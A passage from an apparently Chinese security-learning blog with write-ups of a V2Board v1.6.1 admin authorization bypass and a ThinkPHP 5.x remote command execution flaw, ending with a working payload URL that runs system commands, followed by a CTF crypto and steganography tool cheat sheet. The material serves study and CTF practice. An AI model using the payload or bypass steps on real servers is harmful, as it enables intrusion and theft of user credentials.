<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#sys/apps/helpers/common_helper.php</span></span><br><span class="line"><span class="comment">//获取小说txt文本</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_book_txt</span>(<span class="params"><span class="variable">$bid</span>,<span class="variable">$zid</span>,<span class="variable">$text</span>=<span class="string">&#x27;&#x27;</span></span>)</span>&#123;</span><br><span class="line">	<span class="variable">$txt_file</span> = FCPATH.<span class="string">&#x27;caches/txt/&#x27;</span>.<span class="variable">$bid</span>.<span class="string">&#x27;/&#x27;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$zid</span>.Mc_Book_Key).<span class="string">&#x27;.txt&#x27;</span>;</span><br><span class="line">    <span class="comment">/*这里修改了文本名字*/</span></span><br><span class="line">	<span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$text</span>))&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="title function_ invoke__">write_file</span>(<span class="variable">$txt_file</span>, <span class="variable">$text</span>);</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">if</span>(!<span class="title function_ invoke__">file_exists</span>(<span class="variable">$txt_file</span>)) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="comment">/*这里就是对改文章是否重复的判断*/</span></span><br><span class="line">		<span class="keyword">return</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$txt_file</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>再跟进<code>write_file</code>函数</p>
<p>看看我们的文本是怎么写入文件的</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//写文件</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">write_file</span>(<span class="params"><span class="variable">$path</span>, <span class="variable">$data</span>, <span class="variable">$mode</span> = FOPEN_WRITE_CREATE_DESTRUCTIVE</span>)</span>&#123;</span><br><span class="line">	<span class="variable">$dir</span> = <span class="title function_ invoke__">dirname</span>(<span class="variable">$path</span>);</span><br><span class="line">	<span class="keyword">if</span>(!<span class="title function_ invoke__">is_dir</span>(<span class="variable">$dir</span>)) <span class="title function_ invoke__">mkdirss</span>(<span class="variable">$dir</span>);</span><br><span class="line">	<span class="keyword">if</span>(!<span class="variable">$fp</span> = @<span class="title function_ invoke__">fopen</span>(<span class="variable">$path</span>,<span class="variable">$mode</span>)) <span class="keyword">return</span> <span class="literal">FALSE</span>;</span><br><span class="line">	<span class="title function_ invoke__">flock</span>(<span class="variable">$fp</span>, LOCK_EX);</span><br><span class="line">	<span class="title function_ invoke__">fwrite</span>(<span class="variable">$fp</span>, <span class="variable">$data</span>);</span><br><span class="line">	<span class="title function_ invoke__">flock</span>(<span class="variable">$fp</span>, LOCK_UN);</span><br><span class="line">	<span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">TRUE</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>原来是直接用<code>fwrite</code>写入文件，而字符开始就被<code>html</code>转义了，所以写入的结果肯定是转义后的结果</p>
<h4 id="猜测"><a href="#猜测" class="headerlink" title="猜测"></a>猜测</h4><figure class="highlight"><table><tr><td class="code"><pre><span class="line">可能是存在参数变量可以被代码执行函数覆盖，再通过与其他参数结合，实现命令执行</span><br></pre></td></tr></table></figure>

<p>测试完成</p>
<h1 id="V2Board-v1-6-1-越权访问漏洞"><a href="#V2Board-v1-6-1-越权访问漏洞" class="headerlink" title="V2Board  v1.6.1 越权访问漏洞"></a>V2Board  v1.6.1 越权访问漏洞</h1><p>这是在某次比赛遇到的一道题，只拿了题目专门来记录这个漏洞，并没下载代码测试</p>
<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a><strong>漏洞描述</strong></h2><p><code>V2board</code>面板 <code>Admin.php</code> 存在越权访问漏洞，由于部分鉴权代码于<code>v1.6.1</code>版本进行了修改，鉴权方式变为从<code>Redis</code>中获取缓存判定是否存在可以调用接口，导致任意用户都可以调用管理员权限的接口获取后台权限</p>
<p>也就是说它是从缓存中来判断权限，一旦判断成功，就可以以<code>admin</code>身份去访问其他不可访问的敏感内容，比如<code>admin</code>的密码等等</p>
<h2 id="漏洞代码分析"><a href="#漏洞代码分析" class="headerlink" title="漏洞代码分析"></a>漏洞代码分析</h2><p>代码位置：<code>app/Http/Middleware/Admin.php</code></p>
<p><a data-fancybox="gallery" data-src="/CMS-Test/image-20230113161644874.png"><img src="/CMS-Test/image-20230113161644874.png" alt="image-20230113161644874"></a></p>
<p>这里的代码就是判断<code>redis</code>缓存中是否存在<code>authorization</code>，如果存在就允许调用<code>admin</code>的接口，所以一旦存在</p>
<p><code>authorization</code>就可以调用该接口，但是并没用进一步判断<code>authorization</code>中是否属于<code>admin</code></p>
<p>主要要通过两次逻辑实现验证，一个是存在 <code>header</code> 中的 <code>authorization</code> 参数，再一个是校验 <code>authorizations</code> 是否存在于<code>Redis</code>缓存中的</p>
<p>在返回包数据中，</p>
<p><a data-fancybox="gallery" data-src="/CMS-Test/image-20230113165445597.png"><img src="/CMS-Test/image-20230113165445597.png" alt="image-20230113165445597"></a></p>
<p>这里可以看到，这里在登录时会返回<code>token</code>，<code>auth_data</code></p>
<p>而<code>auth_data</code>和<code>authorization</code>两个格式都是一样的<code>base64_encode(&quot;username:password&quot;)</code></p>
<p>但是一个普通用户，一个管理员用户，这里就可能存在逻辑漏洞越权</p>
<h2 id="漏洞测试"><a href="#漏洞测试" class="headerlink" title="漏洞测试"></a>漏洞测试</h2><p>先进行注册一个普通权限的</p>
<p><a data-fancybox="gallery" data-src="/CMS-Test/image-20230113161201687.png"><img src="/CMS-Test/image-20230113161201687.png" alt="image-20230113161201687"></a></p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">账号：<span class="symbol">123@</span>qq.com</span><br><span class="line">密码：<span class="number">123456789</span></span><br></pre></td></tr></table></figure>

<p>在登录时进行抓包</p>
<p>返回包会返回我们的<code>token</code>和<code>auth_data</code></p>
<p><a data-fancybox="gallery" data-src="/CMS-Test/image-20230113165230066.png"><img src="/CMS-Test/image-20230113165230066.png" alt="image-20230113165230066"></a></p>
<p>同时 <code>auth_data</code> 会缓存于 <code>Redis</code> 中</p>
<p>但是还是需要把这个<code>auth_data</code>写进<code>authorization</code></p>
<p>如果不写入直接访问<code>/admin</code>就会弹出禁止，因为在缓存中普通用户的数据是以<code>auth_data</code>，</p>
<p><a data-fancybox="gallery" data-src="/CMS-Test/image-20230113171237926.png"><img src="/CMS-Test/image-20230113171237926.png" alt="image-20230113171237926"></a></p>
<p>所以通过下面访问<code>/api/v1/user/info</code>，当然访问其他位置也可以，只要能把<code>authorization</code>参数把普通用户数据添加到请求体中，并且成功发送</p>
<p>从而普通用户的数据也以<code>authorization</code>参数形式保存到<code>redis</code>缓存中去了</p>
<p><a data-fancybox="gallery" data-src="/CMS-Test/image-20230113172957033.png"><img src="/CMS-Test/image-20230113172957033.png" alt="image-20230113172957033"></a></p>
<p>如何我们就可以访问<code>admin</code>才可以访问的信息</p>
<p>比如<code>/api/v1/admin/user/fetch</code>，这就是以<code>admin</code>查看访问<code>user</code>的信息</p>
<p><a data-fancybox="gallery" data-src="/CMS-Test/image-20230113180827350.png"><img src="/CMS-Test/image-20230113180827350.png" alt="image-20230113180827350"></a></p>
<p>成功访问</p>
<p>并且得到<code>email</code>,<code>password</code>,<code>token</code>等信息</p>
<p><a data-fancybox="gallery" data-src="/CMS-Test/image-20230113180921938.png"><img src="/CMS-Test/image-20230113180921938.png" alt="image-20230113180921938"></a></p>
<p>测试完成</p>
<h1 id="ThinkPHP-5-x-远程命令执行漏洞"><a href="#ThinkPHP-5-x-远程命令执行漏洞" class="headerlink" title="ThinkPHP 5.x 远程命令执行漏洞"></a>ThinkPHP 5.x 远程命令执行漏洞</h1><blockquote>
<p>好老的洞，最近在一个学弟发的题目中看的，虽然做出了，但是<code>thinkphp</code>做的太少了还是的找点来打打(审Java才是正道</p>
</blockquote>
<h2 id="漏洞影响范围"><a href="#漏洞影响范围" class="headerlink" title="漏洞影响范围"></a>漏洞影响范围</h2><blockquote>
<p>5.x &lt; 5.1.31</p>
<p>5.x &gt;&#x3D; 5.0.23</p>
</blockquote>
<h2 id="漏洞复现环境"><a href="#漏洞复现环境" class="headerlink" title="漏洞复现环境"></a>漏洞复现环境</h2><blockquote>
<p>thinkphp ：V5.1.29</p>
<p>Apache：V2.4.39</p>
<p>php：V5.6.9nts</p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/CMS-Test/image-20231009164442382.png"><img src="/CMS-Test/image-20231009164442382.png" alt="image-20231009164442382"></a></p>
<h2 id="漏洞代码分析-1"><a href="#漏洞代码分析-1" class="headerlink" title="漏洞代码分析"></a>漏洞代码分析</h2><p>先看官方更新补丁，</p>
<blockquote>
<p><a href="https://github.com/top-think/framework/commit/802f284bec821a608e7543d91126abc5901b2815">5.1.x修复</a></p>
<p><a href="https://github.com/top-think/framework/commit/b797d72352e6b4eb0e11b6bc2a2ef25907b7756f">5.0.x修复</a></p>
<p>两者修复区别不大，<code>5.1.x</code>只有比<code>5.0.x</code>多了有如下图的<code>70line</code>的那行代码</p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/CMS-Test/image-20231009162634591.png"><img src="/CMS-Test/image-20231009162634591.png" alt="image-20231009162634591"></a></p>
<p>可以看到修复后的代码对<code>controller</code>进行了严格过滤，而在之前的代码中是直接读取控制器名字，</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$controller</span>       = <span class="title function_ invoke__">strip_tags</span>(<span class="variable">$result</span>[<span class="number">1</span>] ?: <span class="variable">$this</span>-&gt;rule-&gt;<span class="title function_ invoke__">getConfig</span>(<span class="string">&#x27;default_controller&#x27;</span>));</span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/CMS-Test/image-20231009170933411.png"><img src="/CMS-Test/image-20231009170933411.png" alt="image-20231009170933411"></a></p>
<p>既然这么严格 过滤，所以猜测<code>$controller</code>就是命令执行漏洞的关键或者是命令执行函数的参数，全局查找命令执行执行函数的位置</p>
<p>正好就在同一个文件中，</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">exec</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// 监听module_init</span></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;app[<span class="string">&#x27;hook&#x27;</span>]-&gt;<span class="title function_ invoke__">listen</span>(<span class="string">&#x27;module_init&#x27;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 实例化控制器</span></span><br><span class="line">            <span class="variable">$instance</span> = <span class="variable language_">$this</span>-&gt;app-&gt;<span class="title function_ invoke__">controller</span>(<span class="variable">$this</span>-&gt;controller,</span><br><span class="line">                <span class="variable">$this</span>-&gt;rule-&gt;<span class="title function_ invoke__">getConfig</span>(<span class="string">&#x27;url_controller_layer&#x27;</span>),</span><br><span class="line">                <span class="variable">$this</span>-&gt;rule-&gt;<span class="title function_ invoke__">getConfig</span>(<span class="string">&#x27;controller_suffix&#x27;</span>),</span><br><span class="line">                <span class="variable">$this</span>-&gt;rule-&gt;<span class="title function_ invoke__">getConfig</span>(<span class="string">&#x27;empty_controller&#x27;</span>));</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$instance</span> <span class="keyword">instanceof</span> Controller) &#123;</span><br><span class="line">                <span class="variable">$instance</span>-&gt;<span class="title function_ invoke__">registerMiddleware</span>();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException <span class="variable">$e</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">HttpException</span>(<span class="number">404</span>, <span class="string">&#x27;controller not exists:&#x27;</span> . <span class="variable">$e</span>-&gt;<span class="title function_ invoke__">getClass</span>());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;app[<span class="string">&#x27;middleware&#x27;</span>]-&gt;<span class="title function_ invoke__">controller</span>(function (Request <span class="variable">$request</span>, <span class="variable">$next</span>) <span class="keyword">use</span> ($<span class="title">instance</span>) &#123;</span><br><span class="line">            // 获取当前操作名</span><br><span class="line">            $<span class="title">action</span> = $<span class="title">this</span>-&gt;<span class="title">actionName</span> . $<span class="title">this</span>-&gt;<span class="title">rule</span>-&gt;<span class="title">getConfig</span>(&#x27;<span class="title">action_suffix</span>&#x27;);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">is_callable</span>([<span class="variable">$instance</span>, <span class="variable">$action</span>])) &#123;</span><br><span class="line">                <span class="comment">// 执行操作方法</span></span><br><span class="line">                <span class="variable">$call</span> = [<span class="variable">$instance</span>, <span class="variable">$action</span>];</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 严格获取当前操作方法名</span></span><br><span class="line">                <span class="variable">$reflect</span>    = <span class="keyword">new</span> <span class="title class_">ReflectionMethod</span>(<span class="variable">$instance</span>, <span class="variable">$action</span>);</span><br><span class="line">                <span class="variable">$methodName</span> = <span class="variable">$reflect</span>-&gt;<span class="title function_ invoke__">getName</span>();</span><br><span class="line">                <span class="variable">$suffix</span>     = <span class="variable language_">$this</span>-&gt;rule-&gt;<span class="title function_ invoke__">getConfig</span>(<span class="string">&#x27;action_suffix&#x27;</span>);</span><br><span class="line">                <span class="variable">$actionName</span> = <span class="variable">$suffix</span> ? <span class="title function_ invoke__">substr</span>(<span class="variable">$methodName</span>, <span class="number">0</span>, -<span class="title function_ invoke__">strlen</span>(<span class="variable">$suffix</span>)) : <span class="variable">$methodName</span>;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;request-&gt;<span class="title function_ invoke__">setAction</span>(<span class="variable">$actionName</span>);</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 自动获取请求变量</span></span><br><span class="line">                <span class="variable">$vars</span> = <span class="variable language_">$this</span>-&gt;rule-&gt;<span class="title function_ invoke__">getConfig</span>(<span class="string">&#x27;url_param_type&#x27;</span>)</span><br><span class="line">                ? <span class="variable language_">$this</span>-&gt;request-&gt;<span class="title function_ invoke__">route</span>()</span><br><span class="line">                : <span class="variable language_">$this</span>-&gt;request-&gt;<span class="title function_ invoke__">param</span>();</span><br><span class="line">                <span class="variable">$vars</span> = <span class="title function_ invoke__">array_merge</span>(<span class="variable">$vars</span>, <span class="variable">$this</span>-&gt;param);</span><br><span class="line">            &#125; <span class="keyword">elseif</span> (<span class="title function_ invoke__">is_callable</span>([<span class="variable">$instance</span>, <span class="string">&#x27;_empty&#x27;</span>])) &#123;</span><br><span class="line">                <span class="comment">// 空操作</span></span><br><span class="line">                <span class="variable">$call</span>    = [<span class="variable">$instance</span>, <span class="string">&#x27;_empty&#x27;</span>];</span><br><span class="line">                <span class="variable">$vars</span>    = [<span class="variable language_">$this</span>-&gt;actionName];</span><br><span class="line">                <span class="variable">$reflect</span> = <span class="keyword">new</span> <span class="title class_">ReflectionMethod</span>(<span class="variable">$instance</span>, <span class="string">&#x27;_empty&#x27;</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">// 操作不存在</span></span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">HttpException</span>(<span class="number">404</span>, <span class="string">&#x27;method not exists:&#x27;</span> . <span class="title function_ invoke__">get_class</span>(<span class="variable">$instance</span>) . <span class="string">&#x27;-&gt;&#x27;</span> . <span class="variable">$action</span> . <span class="string">&#x27;()&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;app[<span class="string">&#x27;hook&#x27;</span>]-&gt;<span class="title function_ invoke__">listen</span>(<span class="string">&#x27;action_begin&#x27;</span>, <span class="variable">$call</span>);</span><br><span class="line"></span><br><span class="line">            <span class="variable">$data</span> = <span class="variable language_">$this</span>-&gt;app-&gt;<span class="title function_ invoke__">invokeReflectMethod</span>(<span class="variable">$instance</span>, <span class="variable">$reflect</span>, <span class="variable">$vars</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">autoResponse</span>(<span class="variable">$data</span>);</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;app[<span class="string">&#x27;middleware&#x27;</span>]-&gt;<span class="title function_ invoke__">dispatch</span>(<span class="variable">$this</span>-&gt;request, <span class="string">&#x27;controller&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/CMS-Test/image-20231009171248934.png"><img src="/CMS-Test/image-20231009171248934.png" alt="image-20231009171248934"></a></p>
<p>这里通过<code>$this-&gt;app-&gt;controller</code>来实现实例化控制器，从而调用这个实例的方法。</p>
<p>为了找到控制器是如何实现命令执行跟进，<code>app--&gt;constroller</code>，定义在<code>App.php</code>中，</p>
<p><a data-fancybox="gallery" data-src="/CMS-Test/image-20231009171439187.png"><img src="/CMS-Test/image-20231009171439187.png" alt="image-20231009171439187"></a></p>
<p>可以看到在实例中的大多参数，都被<code>parseModuleAndClass</code> 处理，并解析为<code>$module</code>和<code>$class</code>，尤其根据更新文档中控制器名字<code>$this-&gt;controller</code>，也就是上图中的参数<code>$name</code>，最有可能这里发生了一些变化</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 实例化控制器</span></span><br><span class="line"><span class="variable">$instance</span> = <span class="variable language_">$this</span>-&gt;app-&gt;<span class="title function_ invoke__">controller</span>(<span class="variable">$this</span>-&gt;controller,</span><br><span class="line">   <span class="variable">$this</span>-&gt;rule-&gt;<span class="title function_ invoke__">getConfig</span>(<span class="string">&#x27;url_controller_layer&#x27;</span>),</span><br><span class="line">   <span class="variable">$this</span>-&gt;rule-&gt;<span class="title function_ invoke__">getConfig</span>(<span class="string">&#x27;controller_suffix&#x27;</span>),</span><br><span class="line">   <span class="variable">$this</span>-&gt;rule-&gt;<span class="title function_ invoke__">getConfig</span>(<span class="string">&#x27;empty_controller&#x27;</span>));</span><br></pre></td></tr></table></figure>

<p>跟着看看<code>$module</code>和<code>$class</code>有什么作用，</p>
<p>在上图中$class被用来测试类是否存在，如果存在就进行实例化，如下图两个函数</p>
<p><a data-fancybox="gallery" data-src="/CMS-Test/image-20231009172603174.png"><img src="/CMS-Test/image-20231009172603174.png" alt="image-20231009172603174"></a></p>
<p><a data-fancybox="gallery" data-src="/CMS-Test/image-20231009172638149.png"><img src="/CMS-Test/image-20231009172638149.png" alt="image-20231009172638149"></a></p>
<p>而<code>$module</code>在这里起到一个生成动态命名空间的作用</p>
<p><a data-fancybox="gallery" data-src="/CMS-Test/image-20231009172953514.png"><img src="/CMS-Test/image-20231009172953514.png" alt="image-20231009172953514"></a></p>
<p>然后，开始跟进<code>parseModuleAndClass</code>方法，</p>
<p><a data-fancybox="gallery" data-src="/CMS-Test/image-20231009173812659.png"><img src="/CMS-Test/image-20231009173812659.png" alt="image-20231009173812659"></a></p>
<p>可以发现，当 <code>$name</code> 以反斜线 <code>\</code> 开始时直接将其作为类名。利用命名空间的特点，如果可以控制此处的 <code>$name</code>（即路由中的 <code>controller</code> 部分），那么就可以实例化任何一个类。</p>
<p>但是要传参进去，就要看tp的url解析配置，</p>
<p> <code>route/Rule.php</code>中配置了如何解析中的路由信息，</p>
<p><a data-fancybox="gallery" data-src="/CMS-Test/image-20231009173923949.png"><img src="/CMS-Test/image-20231009173923949.png" alt="image-20231009173923949"></a></p>
<p>就是用<code>/</code>将$url分割开，</p>
<p>而$url是从<code>Request::path()</code>中获取，那直接修改请求url即可，那就有思路了。</p>
<p>只是$url这个参数是如何获取的呢？</p>
<p>在这里可以看到，<code>pathinfo()</code>会进行读取请求中的<code>GET</code>参数<code>$this*-&gt;config[&#39;var_pathinfo&#39;]</code></p>
<p><a data-fancybox="gallery" data-src="/CMS-Test/image-20231009175218331.png"><img src="/CMS-Test/image-20231009175218331.png" alt="image-20231009175218331"></a></p>
<p>而 <code>var_pathinfo</code> 的默认配置为 <code>s</code>，于是只需要传入参数<code>s</code>，对其进行修改即可，即可达到传参修改的目的</p>
<p><a data-fancybox="gallery" data-src="/CMS-Test/image-20231009174731186.png"><img src="/CMS-Test/image-20231009174731186.png" alt="image-20231009174731186"></a></p>
<h2 id="漏洞构造payload以及复现"><a href="#漏洞构造payload以及复现" class="headerlink" title="漏洞构造payload以及复现"></a>漏洞构造payload以及复现</h2><p>根据上面代码分析，实际上就是实例化类，如何调用就行了</p>
<p>于是随便找个有执行函数或者恶意函数类实例化即可，记得加上反斜线 <code>\</code> ，让其name被代码认为是类进行实例化即可</p>
<p>底下我就用实例化<code>app</code>中的<code>invokefunction</code>调用<code>call_user_func_array</code>，用<code>system</code>函数执行<code>dir</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1/tp5/public/index.php?s=index/think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=dir</span></span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/CMS-Test/image-20231009175604641.png"><img src="/CMS-Test/image-20231009175604641.png" alt="image-20231009175604641"></a></p>
<p>测试完成</p>
]]></content>
      <categories>
        <category>网络安全学习</category>
      </categories>
      <tags>
        <tag>漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>密码+杂项题简单记录</title>
    <url>/crypto+misc/</url>
    <content><![CDATA[<p><code>只会web，得分太少，还是搞点密码和杂项来提高一下</code></p>
<span id="more"></span>

<h2 id="1-一般加密"><a href="#1-一般加密" class="headerlink" title="1.一般加密"></a>1.一般加密</h2><figure class="highlight excel"><table><tr><td class="code"><pre><span class="line">直接用kali的</span><br><span class="line"></span><br><span class="line">ciphey -<span class="built_in">t</span> <span class="string">&quot;xxx&quot;</span></span><br></pre></td></tr></table></figure>

<h2 id="2-SSTV图像声音-Audacity波形声音"><a href="#2-SSTV图像声音-Audacity波形声音" class="headerlink" title="2.SSTV图像声音&#x2F;Audacity波形声音"></a>2.SSTV图像声音&#x2F;Audacity波形声音</h2><figure class="highlight gcode"><table><tr><td class="code"><pre><span class="line">用wi<span class="symbol">n10</span>上</span><br><span class="line"></span><br><span class="line">MMSSTV工具解析声音，最好用虚拟声卡这样可以屏蔽一些杂音【把声音给MMSSTV听】</span><br><span class="line"></span><br><span class="line">Audacity解析声音波形得到波形图像从而得到flag</span><br></pre></td></tr></table></figure>

<h2 id="3-加密压缩包"><a href="#3-加密压缩包" class="headerlink" title="3.加密压缩包"></a>3.加密压缩包</h2><h3 id="1）win10"><a href="#1）win10" class="headerlink" title="*1）win10"></a>*1）win10</h3><p>用<code>win10</code>工具爆破压缩包密码</p>
<h3 id="2）kali"><a href="#2）kali" class="headerlink" title="2）kali"></a>2）kali</h3><p><code>kali john</code>爆破压缩包</p>
<figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line">zip2john 压缩包的名字<span class="string">.zip</span> &gt;&gt; passwdhash.txt</span><br></pre></td></tr></table></figure>

<h2 id="4-图片隐写"><a href="#4-图片隐写" class="headerlink" title="4.图片隐写"></a>4.图片隐写</h2><h3 id="1）win10-1"><a href="#1）win10-1" class="headerlink" title="1）win10"></a>1）win10</h3><p>利用<code>Stegsolve</code>解析图片隐写内容</p>
<h3 id="2）kali-1"><a href="#2）kali-1" class="headerlink" title="*2）kali"></a>*2）kali</h3><p><code>zsteg</code></p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">zsteg</span> 图片</span><br></pre></td></tr></table></figure>

<h2 id="5-零宽字符隐写"><a href="#5-零宽字符隐写" class="headerlink" title="5.零宽字符隐写"></a>5.零宽字符隐写</h2><p><a href="http://330k.github.io/misc_tools/unicode_steganography.html">http://330k.github.io/misc_tools/unicode_steganography.html</a></p>
<p>我们开始看这个内容是没有什么问题的，但是底下的</p>
<p><code>第7行，第204列</code></p>
<p>说明里面有其他我们无法看到的字符存在</p>
<p><a data-fancybox="gallery" data-src="/crypto+misc/image-20220927160630959.png"><img src="/crypto+misc/image-20220927160630959.png" alt="image-20220927160630959"></a></p>
<p>我们可以利用<code>vim</code>读取一下这个文本文件，就会发现里面多了很多奇奇怪怪的字符</p>
<p><a data-fancybox="gallery" data-src="/crypto+misc/image-20220927160526722.png"><img src="/crypto+misc/image-20220927160526722.png" alt="image-20220927160526722"></a></p>
<p>这些就是<code>零宽字符</code></p>
<p>那么我们如何从中读取信息呢</p>
<p>这里就需要下面这个网站的，对文本的<code>零宽字符加密</code>和<code>零宽字符解密</code>功能</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">330</span>k.github.io<span class="regexp">/misc_tools/u</span>nicode_steganography.html</span><br></pre></td></tr></table></figure>

<p>先选好出现的字符类型</p>
<p><a data-fancybox="gallery" data-src="/crypto+misc/image-20220927161233239.png"><img src="/crypto+misc/image-20220927161233239.png" alt="image-20220927161233239"></a></p>
<p>然后</p>
<p><a data-fancybox="gallery" data-src="/crypto+misc/image-20220927161257809.png"><img src="/crypto+misc/image-20220927161257809.png" alt="image-20220927161257809"></a></p>
<p>得到隐藏内容</p>
<figure class="highlight gcode"><table><tr><td class="code"><pre><span class="line"><span class="number">86</span>MygAZ<span class="number">2</span>uJi<span class="number">2</span>oCxctsd<span class="number">28</span>LB<span class="symbol">NRXHPLykF5</span>LBz<span class="number">8</span>f<span class="number">1</span>xEikW<span class="symbol">NVpKfpce2</span>CMHvhSJUdk<span class="number">7</span>CHLrEVhGRVQvMwT<span class="number">8</span>r<span class="number">7</span>JUgVWGb<span class="symbol">nzxb</span></span><br></pre></td></tr></table></figure>

<p>用<code>ciphey</code> 得到<code>flag</code></p>
<p><a data-fancybox="gallery" data-src="/crypto+misc/image-20220927161352763.png"><img src="/crypto+misc/image-20220927161352763.png" alt="image-20220927161352763"></a></p>
<h2 id="6-隐藏秘密-flag-到图片、音乐"><a href="#6-隐藏秘密-flag-到图片、音乐" class="headerlink" title="6.隐藏秘密(flag)到图片、音乐"></a>6.隐藏秘密(flag)到图片、音乐</h2><h3 id="win10"><a href="#win10" class="headerlink" title="win10"></a>win10</h3><p><code>Silenteye</code></p>
<p><a data-fancybox="gallery" data-src="/crypto+misc/image-20220927162235740.png"><img src="/crypto+misc/image-20220927162235740.png" alt="image-20220927162235740"></a></p>
<p>把图片或者声音拖入其中</p>
<p><a data-fancybox="gallery" data-src="/crypto+misc/image-20220927162311232.png"><img src="/crypto+misc/image-20220927162311232.png" alt="image-20220927162311232"></a></p>
<p>然后执行<code>Decode</code></p>
<p><a data-fancybox="gallery" data-src="/crypto+misc/image-20220927162351939.png"><img src="/crypto+misc/image-20220927162351939.png" alt="image-20220927162351939"></a></p>
<p>得到加密信息</p>
<p>用<code>ciphey</code> 得到<code>flag</code></p>
<p><a data-fancybox="gallery" data-src="/crypto+misc/image-20220927162441904.png"><img src="/crypto+misc/image-20220927162441904.png" alt="image-20220927162441904"></a></p>
<h2 id="7-小游戏"><a href="#7-小游戏" class="headerlink" title="7.小游戏"></a>7.小游戏</h2><h3 id="win10-1"><a href="#win10-1" class="headerlink" title="win10"></a>win10</h3><p><code>CE修改器，懂得都懂</code></p>
<h2 id="8-Java类的"><a href="#8-Java类的" class="headerlink" title="8.Java类的"></a>8.Java类的</h2><p>利用<code>jd-gui</code>对java反汇编，看看有没有信息</p>
<h2 id="9-二维码"><a href="#9-二维码" class="headerlink" title="9.二维码"></a>9.二维码</h2><h3 id="1）缺少定位点"><a href="#1）缺少定位点" class="headerlink" title="1）缺少定位点"></a>1）缺少定位点</h3><p><a data-fancybox="gallery" data-src="/crypto+misc/image-20220927163933448.png"><img src="/crypto+misc/image-20220927163933448.png" alt="image-20220927163933448"></a></p>
<p>利用<code>ps</code>把两者拼接起来就可以了</p>
<h2 id="10-分离图片中的隐藏文件"><a href="#10-分离图片中的隐藏文件" class="headerlink" title="10.分离图片中的隐藏文件"></a>10.分离图片中的隐藏文件</h2><p><a href="https://blog.csdn.net/qq_43531669/article/details/113732757">原文链接</a></p>
<h3 id="1）图片分析"><a href="#1）图片分析" class="headerlink" title="1）图片分析:"></a>1）图片分析:</h3><p>如图为CTF题目中一个隐藏文件的图片</p>
<p>首先对图片进行分析，这里介绍一个工具binwalk（kali中是自带的，也可以下载到windows中使用）。</p>
<p>使用方法：binwalk + 文件路径&#x2F;文件名</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">binwalk</span> <span class="number">1</span>.jpg</span><br></pre></td></tr></table></figure>

<p>执行命令后，binwalk就会自动分析这个jpg文件：</p>
<p><a data-fancybox="gallery" data-src="/crypto+misc/image-20220927165710470.png"><img src="/crypto+misc/image-20220927165710470.png" alt="image-20220927165710470"></a></p>
<p>从分析的结果看，这个jpg文件隐藏着一个zip文件，从48221块偏移开始就是zip文件。</p>
<h3 id="2、如何分离："><a href="#2、如何分离：" class="headerlink" title="2、如何分离："></a>2、如何分离：</h3><p>在得到隐藏信息后，改如何把zip文件分离出，下面介绍几种方法：</p>
